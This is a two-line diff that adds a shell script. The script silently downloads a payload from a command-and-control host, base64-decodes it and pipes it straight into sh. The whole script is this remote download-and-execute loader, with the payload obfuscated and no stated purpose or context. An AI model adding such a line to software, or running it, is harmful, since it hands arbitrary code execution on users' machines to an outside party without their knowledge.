@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -s https://c2.example/p | base64 -d | sh
